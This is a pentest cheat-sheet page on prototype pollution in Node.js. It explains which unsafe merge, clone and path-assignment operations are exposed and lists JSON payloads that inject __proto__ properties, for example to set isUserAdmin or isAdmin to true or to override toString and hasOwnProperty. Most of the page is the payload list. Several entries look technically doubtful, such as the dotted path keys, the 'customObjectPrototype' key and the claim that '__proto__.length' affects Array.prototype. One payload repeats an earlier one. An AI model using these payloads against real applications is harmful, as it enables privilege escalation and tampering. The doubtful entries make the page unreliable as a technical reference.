---
description: Affects Node.js
icon: smog
---

# Prototype Pollution

{% hint style="info" %}
<mark style="color:purple;">**Prototype pollution happens at some unsafe**</mark>**&#x20;**<mark style="color:orange;">**`merge`**</mark><mark style="color:purple;">**,**</mark>**&#x20;**<mark style="color:orange;">**`clone`**</mark><mark style="color:purple;">**,**</mark>**&#x20;**<mark style="color:orange;">**`extend`**</mark>**&#x20;**<mark style="color:purple;">**and**</mark>**&#x20;**<mark style="color:orange;">**`path assignment`**</mark>**&#x20;**<mark style="color:purple;">**operations on malicious**</mark>**&#x20;**<mark style="color:orange;">**`JSON`**</mark>**&#x20;**<mark style="color:purple;">**objects.**</mark>

* <mark style="color:purple;">**This is exploitable only if any of the following three happens:**</mark>
  * <mark style="color:red;">**`Object recursive merge`**</mark>
  * <mark style="color:red;">**`Property definition by path`**</mark>&#x20;
  * <mark style="color:red;">**`Object clone`**</mark>
* <mark style="color:purple;">Some of the most popular libraries being affected are</mark> <mark style="color:orange;">**`lodash`**</mark> <mark style="color:purple;">and</mark> <mark style="color:orange;">**`Hoek`**</mark>
* <mark style="color:orange;">**`Templates`**</mark> <mark style="color:purple;">are a good target for prototype pollution.</mark>
{% endhint %}

***

{% hint style="danger" %}
### <mark style="color:purple;">Payloads</mark>

* <mark style="color:purple;">The most straightforward example of prototype pollution involves injecting the</mark> <mark style="color:orange;">**`__proto__`**</mark> <mark style="color:purple;">property, which affects all objects that inherit from</mark> <mark style="color:orange;">**`Object.prototype`**</mark><mark style="color:purple;">**.**</mark>
* <mark style="color:purple;">This example adds the</mark> <mark style="color:orange;">**`isUserAdmin`**</mark> <mark style="color:purple;">property to the prototype chain:</mark>

{% code overflow="wrap" %}
```json
{
  "__proto__": {
    "isUserAdmin": true
  }
}
```
{% endcode %}

* <mark style="color:purple;">Also, you can directly manipulate the</mark> <mark style="color:orange;">**`Object.prototype`**</mark> <mark style="color:purple;">by modifying the</mark> <mark style="color:orange;">**`__proto__`**</mark> <mark style="color:purple;">property. This could be done in objects passed to vulnerable code:</mark>

{% code overflow="wrap" %}
```json
{
  "__proto__": {
    "toString": "malicious code"
  }
}
```
{% endcode %}

* <mark style="color:purple;">If the application allows you to define properties via paths (e.g.,</mark> <mark style="color:orange;">**`obj.a.b`**</mark><mark style="color:purple;">):</mark>

```json
{
  "a.b.__proto__.isHacked": true
}
```

* <mark style="color:purple;">The</mark> <mark style="color:orange;">**`constructor`**</mark> <mark style="color:purple;">property is part of the prototype chain for JavaScript objects:</mark>

{% code overflow="wrap" %}
```json
{
  "__proto__.constructor": "MaliciousFunction"
}
```
{% endcode %}

* <mark style="color:purple;">The</mark> <mark style="color:orange;">**`hasOwnProperty`**</mark> <mark style="color:purple;">method is often used to check if an object has a property, but it can be overridden in the prototype:</mark>

```json
{
  "__proto__.hasOwnProperty": false
}
```

* <mark style="color:purple;">If an attacker can manipulate built-in objects' prototypes (like</mark> <mark style="color:orange;">**`Array.prototype`**</mark> <mark style="color:purple;">or</mark> <mark style="color:orange;">**`Function.prototype`**</mark><mark style="color:purple;">), they could affect the behavior of all instances of those types:</mark>

```json
{
  "__proto__.length": 1000
}
```

* <mark style="color:purple;">If the application uses a templating engine and allows user input to be rendered without sanitization, an attacker might inject a prototype pollution payload directly via the template:</mark>

```json
{
  "__proto__": {
    "isAdmin": true
  }
}
```

* <mark style="color:purple;">You can directly inject properties into the prototype of custom classes or objects:</mark>

```json
{
  "customObjectPrototype.isHacked": true
}
```
{% endhint %}

